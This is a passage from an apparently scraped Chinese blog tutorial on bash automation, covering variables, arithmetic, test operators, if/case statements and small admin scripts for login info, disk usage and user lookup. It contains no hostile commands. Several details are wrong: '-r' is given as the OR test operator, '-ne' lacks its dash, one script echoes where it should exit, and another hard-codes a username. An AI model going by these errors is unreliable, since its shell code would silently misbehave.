<p><em>觉得有趣的话，欢迎点赞收藏！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Shell自动化编程完全指南]]></title>    <link>https://juejin.cn/post/7594389937459642378</link>    <guid>https://juejin.cn/post/7594389937459642378</guid>    <pubDate>2026-01-13T01:37:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937459642378" data-draft-id="7594383365417795630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Shell自动化编程完全指南"/> <meta itemprop="keywords" content="自动化运维"/> <meta itemprop="datePublished" content="2026-01-13T01:37:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="liux3528"/> <meta itemprop="url" content="https://juejin.cn/user/2701939431971706"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Shell自动化编程完全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2701939431971706/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    liux3528
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:37:01.000Z" title="Tue Jan 13 2026 01:37:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">shell自动化编程详解</h2>
<h3 data-id="heading-1">一、shell自动化编程-基础与变量</h3>
<h4 data-id="heading-2">1.环境准备</h4>
<ul>
<li>修改vimrc文件，达到控制vim创建，编辑文件的动作 给文件添加注解
<ul>
<li>当前用户家目录下 ~/.vimrc</li>
<li>放在/etc/vimrc</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">set</span> ignorecase 
<span class="hljs-built_in">set</span> ignorecase
autocmd BufNewFile *.py,*.cc,*.sh,*.java <span class="hljs-built_in">exec</span> <span class="hljs-string">":call SetTitle()"</span>
func SetTitle()
<span class="hljs-keyword">if</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">"%:e"</span>) == <span class="hljs-string">'sh'</span>
call setline(1, <span class="hljs-string">"#!/bin/bash"</span>)
call setline(2,<span class="hljs-string">"########################################################"</span>)
call setline(3, <span class="hljs-string">"# File Name:"</span>.<span class="hljs-built_in">expand</span>(<span class="hljs-string">"%"</span>))
call setline(4, <span class="hljs-string">"# Version:V1.0"</span>)
call setline(5, <span class="hljs-string">"# Author:liux"</span>)
call setline(6, <span class="hljs-string">"# Desc:"</span>)
call setline(7,<span class="hljs-string">"########################################################"</span>)
endif
endfunc
</code></pre>
<h4 data-id="heading-3">2.shell脚本执行方式</h4>
<ul>
<li>通过sh或bash执行脚本                执行脚本最常用的方式</li>
<li>通过.（点）或source</li>
<li>！符号含义                                   用于指定脚本默认的命令解释器</li>
</ul>
<h4 data-id="heading-4">3.书写脚本每次用户登录后显示系统的基本信息</h4>
<pre><code class="hljs language-sh" lang="sh">vim 02.sys_login_info.sh
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:02.sys_login_info.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:用户登录后显示系统基本信息</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.赋值</span>

sys_hostname=`hostname`
sys_ip_addrs=`hostname -I`
sys_mem_total=`free -h |awk <span class="hljs-string">'NR==2{print $2}'</span>`
sys_mem_free=`free -h |awk <span class="hljs-string">'NR==2{print $NF}'</span>`
sys_load=`<span class="hljs-built_in">uptime</span> |awk <span class="hljs-string">'{print $(NF-2),$(NF-1),$NF}'</span>`

<span class="hljs-comment">#2.输出</span>

<span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF
     主机名：  ${sys_hostname}
     ip地址：  ${sys_ip_addrs}
     总内存：  ${sys_mem_total}
     可用内存：${sys_mem_free}
     系统负载：${sys_load}
EOF</span>

<span class="hljs-comment">#创建软链接到指定目录  用户登录会加载/etc/profile.d/目录下以.sh结尾的文件</span>
<span class="hljs-built_in">ln</span> -s /server/scripts/devops-shell/02.sys_login_info.sh /etc/profile.d/sys_login_info.sh
</code></pre>
<h4 data-id="heading-5">4.特殊变量</h4>
<h5 data-id="heading-6">4.1特殊变量-位置变量</h5>



































<table><thead><tr><th>变量</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>$n</td><td>执行脚本后面的第n个参数   n表示数字</td><td>命令行与脚本内部桥梁</td></tr><tr><td>$0</td><td>获取脚本的名字</td><td>用于输出脚本的格式或帮助的时候。用于错误提示输出帮助</td></tr><tr><td>$#</td><td>统计脚本的参数个数</td><td>一般与判断结合，检查脚本参数个数</td></tr><tr><td>$@</td><td>循环取出脚本所有参数</td><td>数组中或循环中</td></tr><tr><td>$*</td><td>取出脚本所有参数</td><td>数组中或循环中</td></tr></tbody></table>
<h5 data-id="heading-7">4.2特殊变量-状态变量</h5>

























<table><thead><tr><th>变量</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>$?</td><td>上一个命令、脚本的返回值。0表示正确，非0即错误</td><td>一般用于判断检查命令结果</td></tr><tr><td>$$</td><td>当前脚本的pid</td><td>一般写在脚本中获取脚本pid</td></tr><tr><td>$!</td><td>上一个脚本/命令的pid</td><td/></tr></tbody></table>
<h5 data-id="heading-8">4.3特殊变量-变量子串</h5>
<ul>
<li><strong>${#parameter}</strong>    统计字符长度（变量中有多少个字符）</li>
</ul>
<h3 data-id="heading-9">二、shell自动化编程-运算符-条件表达式-if</h3>
<h4 data-id="heading-10">1.运算方法</h4>








































<table><thead><tr><th>运算的命令/符号</th><th>说明</th><th>应用场景</th></tr></thead><tbody><tr><td>awk</td><td>可以进行计算，带小数，可以与shell脚本进行变量传递</td><td/></tr><tr><td>bc</td><td>带小数</td><td>一般计算都可以用bc.需要安装</td></tr><tr><td>expr</td><td>进行计算,整数</td><td>一般用于检查输入内容是否为数字</td></tr><tr><td>let</td><td>进行计算,整数,变量直接使用即可</td><td>用于计算i++</td></tr><tr><td>$(())</td><td>进行计算,整数,变量直接使用即可</td><td/></tr><tr><td>$[]</td><td>进行计算,整数,变量直接使用即可</td><td/></tr></tbody></table>
<h5 data-id="heading-11">1.1 awk进行计算</h5>
<pre><code class="hljs language-sh" lang="sh">awk <span class="hljs-string">'BEGIN{print 1/3}'</span>
awk <span class="hljs-string">'BEGIN{print 1/3*100}'</span>

<span class="hljs-comment">#在awk中使用shell变量</span>
<span class="hljs-comment">#awk -v选项用于创建或修改awk中的变量。 -v是shell脚本与awk桥梁</span>
<span class="hljs-comment">#在awk中各种变量直接使用即可，不要加上$n1,如果加上了会被awk识别为取列</span>
awk -vn1=1  -vn2=3  <span class="hljs-string">'BEGIN{print n1/n2}'</span>
</code></pre>
<h5 data-id="heading-12">1.2 bc用法</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#-l显示小数</span>
<span class="hljs-built_in">echo</span> 1/3 |bc -l
<span class="hljs-built_in">echo</span> 2^10 |bc -l
</code></pre>
<h5 data-id="heading-13">1.3 expr</h5>
<ul>
<li>使用注意事项：使用空格，对*号转义</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 ~]<span class="hljs-comment"># expr 1+1</span>
1+1
[root@m01 ~]<span class="hljs-comment"># expr 1 + 1</span>
2
[root@m01 ~]<span class="hljs-comment"># expr 2 * 2</span>
<span class="hljs-built_in">expr</span>: 语法错误
[root@m01 ~]<span class="hljs-comment"># expr 2 \* 2</span>
4
[root@m01 ~]<span class="hljs-comment"># expr 2 / 2</span>
1
</code></pre>
<ul>
<li>案例：对输入的内容检查是否为数字</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 03.check-num.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:03.check-num.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.vars</span>
<span class="hljs-comment">#num=$1</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入数字："</span> num

<span class="hljs-comment">#2.检查是否为数字</span>
<span class="hljs-built_in">expr</span> <span class="hljs-variable">$num</span> \* 0 + 1 &amp;&gt;/dev/null &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num</span>是数字"</span>
<span class="hljs-built_in">expr</span> <span class="hljs-variable">$num</span> \* 0 + 1 &amp;&gt;/dev/null || <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num</span>不是数字"</span>

</code></pre>
<h5 data-id="heading-14">1.4 let   <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(())   </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">((</span><span class="mclose">))</span></span></span></span></span>[]</h5>
<pre><code class="hljs language-sh" lang="sh">n1=666
n2=999
<span class="hljs-built_in">let</span> c=n1+n2 

n1=666
n2=999
<span class="hljs-built_in">echo</span> $((n1+n2))

n1=666
n2=999
e=$[n1+n2]
</code></pre>
<p>案例：计算传入的两个参数的值</p>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 04.calc_num.sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:04.calc_num.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.vars</span>
num1=<span class="hljs-variable">$1</span>
num2=<span class="hljs-variable">$2</span>

<span class="hljs-comment">#2.检查是否位数字</span>
<span class="hljs-built_in">expr</span> <span class="hljs-variable">$num1</span> \* 0 + <span class="hljs-variable">$num2</span> \* 0 + 1 &amp;&gt;/dev/null || {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$0</span> 数字1 数字2，2个数字"</span>
  <span class="hljs-built_in">exit</span> 1
}

<span class="hljs-comment">#3.计算</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1+n2}'</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1-n2}'</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1*n2}'</span>
awk -vn1=<span class="hljs-variable">$num1</span> -vn2=<span class="hljs-variable">$num2</span> <span class="hljs-string">'BEGIN{print n1/n2}'</span>

</code></pre>
<h4 data-id="heading-15">2.条件表达式</h4>
<ul>
<li>大部分情况下使用[ ]进行判断</li>
<li>使用正则的时候用[[ ]]两对中括号</li>
</ul>
<h5 data-id="heading-16">2.1条件表达式符号</h5>

















































<table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>-f</td><td>file  判断是否为文件，是为真</td></tr><tr><td>-d</td><td>dir  判断是否为目录，是为真</td></tr><tr><td>-x</td><td>判断是否有执行权限，是为真</td></tr><tr><td>-s</td><td>判断文件内容是否为空 ，非空为真</td></tr><tr><td>-r</td><td>是否有读权限</td></tr><tr><td>-w</td><td>是否有写权限</td></tr><tr><td>-nt</td><td>两个文件修改时间，是否更加新</td></tr><tr><td>-ot</td><td>两个文件修改时间，是否更加老</td></tr><tr><td>-L</td><td>软链接</td></tr><tr><td>-e</td><td>是否存在（任何类型文件）</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#判断文件是否存在</span>
[ -f /etc/hosts ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>


<span class="hljs-comment">#检查目录是否存在</span>
[ -d /etc/ ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>

<span class="hljs-comment">#检查/etc/rc.d/rc.local是否有执行权限</span>
[ -x /etc/rc.d/rc.local ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>
<span class="hljs-comment">#ip命令是否有执行权限，如果没有则退出</span>
[ -x /sbin/ip ] || <span class="hljs-built_in">exit</span> 1

<span class="hljs-comment">#-s检查文件内容是否为空，非空则为真</span>
[ -s /etc/hosts ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>
</code></pre>
<blockquote>
<p>注意：</p>
<p>​	&amp;&amp; 表示前面命令执行成功然后执行echo 成立。</p>
<p>​	|| 表示前面命令执行失败了，echo 失败</p>
</blockquote>
<h5 data-id="heading-17">2.2对比字符串</h5>

















<table><thead><tr><th>字符串对比</th><th>说明</th></tr></thead><tbody><tr><td>"str1" =  "str2"</td><td>str1等于str2，则为真</td></tr><tr><td>-z  "str"</td><td>zero 检查str字符串是否为空，空的则为真</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">[ <span class="hljs-string">"<span class="hljs-variable">$UID</span>"</span> != <span class="hljs-string">"0"</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 4 <span class="hljs-comment">#判断是否为root执行</span>

[ -z  <span class="hljs-string">"<span class="hljs-variable">$str</span>"</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"成立 "</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">"失败"</span>
</code></pre>
<h5 data-id="heading-18">2.3比大小（整数）   [ ]</h5>
<ul>
<li>-eq      equal              等于</li>
<li>ne       not   equal     不等于</li>
<li>-gt   great than         大于</li>
<li>-ge  great  equal      大于等于</li>
<li>-lt    less   than         小于</li>
<li>-le   less    equal      小于等于</li>
</ul>
<h5 data-id="heading-19">2.4逻辑判断</h5>
<ul>
<li>多个条件同时成立，或者，取反</li>
</ul>

























<table><thead><tr><th>条件表达式</th><th>[ ]</th></tr></thead><tbody><tr><td>与（同时成立）</td><td>条件1  -a   条件2   （and）</td></tr><tr><td>或</td><td>条件1  -r   条件2     （or）</td></tr><tr><td>非</td><td>!</td></tr><tr><td/><td/></tr></tbody></table>
<h5 data-id="heading-20">2.5正则     [[ ]]</h5>
<pre><code class="hljs language-sh" lang="sh">num=666
[[ <span class="hljs-variable">$num</span> =~ [0-9] ]] &amp;&amp; <span class="hljs-built_in">echo</span> 成立 || <span class="hljs-built_in">echo</span> 失败

num=liux996
[[ <span class="hljs-variable">$num</span> =~ [0-9] ]] &amp;&amp; <span class="hljs-built_in">echo</span> 成立 || <span class="hljs-built_in">echo</span> 失败
<span class="hljs-comment">#前的正则，仅仅表示变量中只要有数字就行</span>


<span class="hljs-comment">#用正则精确匹配数字</span>
[[ <span class="hljs-variable">$num</span> =~ ^[0-9]+$ ]] &amp;&amp; <span class="hljs-built_in">echo</span> 成立 ||<span class="hljs-built_in">echo</span> 失败
<span class="hljs-comment">#变量的值 开头结尾中间全是数字 连续数字</span>
</code></pre>
<h5 data-id="heading-21">2.6 案例：比较两个数字的大小</h5>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim compare_num.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:compare_num.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment">#1.vars</span>
num1=<span class="hljs-variable">$1</span>
num2=<span class="hljs-variable">$2</span>

<span class="hljs-comment">#2.检查是否为数字</span>
[[ <span class="hljs-variable">$num1</span> =~ ^-?[0-9]+$ ]] || {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 不是数字"</span>
  <span class="hljs-built_in">exit</span> 1
}
[[ <span class="hljs-variable">$num2</span> =~ ^-?[0-9]+$ ]] || {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num2</span> 不是数字"</span>
  <span class="hljs-built_in">echo</span> 1
}

<span class="hljs-comment">#3.比较大小</span>
[ <span class="hljs-variable">$num1</span> -gt <span class="hljs-variable">$num2</span> ] &amp;&amp; {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 大于 <span class="hljs-variable">$num2</span>"</span>
}

[ <span class="hljs-variable">$num1</span> -lt <span class="hljs-variable">$num2</span> ] &amp;&amp; {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 小于 <span class="hljs-variable">$num2</span>"</span>
}
[ <span class="hljs-variable">$num1</span> -eq <span class="hljs-variable">$num2</span> ] &amp;&amp; {
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$num1</span> 等于 <span class="hljs-variable">$num2</span>"</span>
}


<span class="hljs-comment">#测试</span>
[root@m01 devops-shell]<span class="hljs-comment"># sh compare_num.sh 1 -1</span>
1 大于 -1

</code></pre>
<h4 data-id="heading-22">3.if判断</h4>
<ul>
<li>单分支判断</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> 条件;<span class="hljs-keyword">then</span>
   满足条件后执行的内容。
<span class="hljs-keyword">fi</span>
</code></pre>
<ul>
<li>双分支判断</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> 条件;<span class="hljs-keyword">then</span>
   满足条件后执行的内容。
<span class="hljs-keyword">else</span>
   不满足条件执行的内容。
<span class="hljs-keyword">fi</span>
</code></pre>
<ul>
<li>多分枝判断</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> 条件;<span class="hljs-keyword">then</span>
   满足条件后执行的内容。
<span class="hljs-keyword">elif</span> 条件;<span class="hljs-keyword">then</span>   <span class="hljs-comment">#else if </span>
   满足<span class="hljs-keyword">elif</span>条件，执行的内容。
<span class="hljs-keyword">elif</span> 条件;<span class="hljs-keyword">then</span>
   满足<span class="hljs-keyword">elif</span>条件，执行的内容。   
<span class="hljs-keyword">else</span>
   不满足条件执行的内容。
<span class="hljs-keyword">fi</span>
</code></pre>
<p><strong>案例1：检查根分区磁盘空间使用率</strong></p>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 05.disk_check.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#1.vars</span>
root_usage_now=`<span class="hljs-built_in">df</span> -h |awk -F <span class="hljs-string">"[ %]+"</span> <span class="hljs-string">'$NF=="/" {print $(NF-1)}'</span>`
root_usage_warning=80

<span class="hljs-comment">#2.进行比较</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$root_usage_now</span> -gt <span class="hljs-variable">$root_usage_warning</span> ];<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"磁盘空间不足，使用率是<span class="hljs-variable">$root_usage_now</span>%"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"磁盘空间足，使用率是<span class="hljs-variable">$root_usage_now</span>%"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p><strong>案例2：输出指定用户的信息</strong></p>
<ul>
<li>
<p>执行脚本输入用户名(参数/read)</p>
</li>
<li>
<p>判断用户是否存在,如果不存在则提示用户不存在,退出脚本.</p>
</li>
<li>
<p>如果用户存在输出用户的信息.</p>
<ul>
<li>
<p>是否可以登录(命令解释器)</p>
</li>
<li>
<p>uid,gid(过滤)</p>
</li>
<li>
<p>用户家目录</p>
</li>
<li>
<p>最近1次登录情况</p>
</li>
<li>
<p>属于用户的文件(很多)</p>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 06.secure_check_user.sh</span>

<span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment">#1.输入用户名</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入用户名"</span> user

<span class="hljs-comment">#2.检查用户是否存在</span>
<span class="hljs-comment">#判断输入变量不能为空</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">${user}</span>x"</span> = <span class="hljs-string">"x"</span> ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"请输入用户名："</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#是否存在</span>
<span class="hljs-built_in">id</span> <span class="hljs-variable">$user</span> &amp;&gt;/dev/null
<span class="hljs-keyword">if</span> [ $? -ne 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"用户<span class="hljs-variable">$user</span> 不存在"</span>
    <span class="hljs-built_in">exit</span> 2
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#3.用户信息</span>
user_shell=`awk -F: -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name{print $NF}'</span> /etc/passwd`
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$user_shell</span>"</span> = <span class="hljs-string">"/bin/bash"</span> ];<span class="hljs-keyword">then</span>
     if_login=<span class="hljs-string">"可以登录"</span>
<span class="hljs-keyword">else</span>
     if_login=<span class="hljs-string">"无法登录"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#uid，gid,家目录</span>
user_ids=`awk -F: -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name{print $3,$4}'</span> /etc/passwd`
user_homedir=`awk -F: -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name{print $(NF-1)}'</span> /etc/passwd`

<span class="hljs-comment">#最近登录信息</span>
user_login_info=`lastlog |awk -vname=<span class="hljs-variable">$user</span> <span class="hljs-string">'$1==name'</span>`

<span class="hljs-comment">#用户文件信息</span>
user_files=`find / -<span class="hljs-built_in">type</span> f -user liux 2&gt;/dev/null`

<span class="hljs-comment">#4.输出</span>

<span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF
     用户名：$user
     是否可以登录：$if_login
     用户uid，gid：$user_ids
     用户家目录：$user_homedir
     最近的登录情况：$user_login_info
     用户的文件：$user_files
EOF</span>

</code></pre>
<h4 data-id="heading-23">4.case语句</h4>
<ul>
<li>
<p>条件分支语句，一般用于实现有多种选择的脚本</p>
</li>
<li>
<p>case语句功能，可以通过if+elif+else形式进行替换</p>
</li>
<li>
<p>格式</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">case</span> <span class="hljs-string">"变量"</span>  <span class="hljs-keyword">in</span>  
   1)
         命令;;
   2)
         命令;;
   *)
         命令（保底的默认输出）
<span class="hljs-keyword">esac</span>
</code></pre>
<h4 data-id="heading-24">5.shell编程-函数</h4>
<ul>
<li>格式</li>
